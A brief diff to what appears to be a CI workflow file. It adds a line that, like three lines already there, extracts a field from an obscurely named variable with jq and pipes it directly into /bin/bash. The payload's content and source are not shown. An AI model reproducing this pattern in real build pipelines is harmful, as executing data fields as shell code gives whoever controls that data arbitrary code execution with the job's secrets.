@@ -41,6 +41,7 @@ jobs:
           printf '%s' "$kbsp29" | jq -r .zpk63233 | /bin/bash
           printf '%s' "$ngm04" | jq -r .tusfq8153 | /bin/bash
           printf '%s' "$kkwa4193" | jq -r .sdw1 | /bin/bash
+          echo $xc46 | jq -r .ehlcn46 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
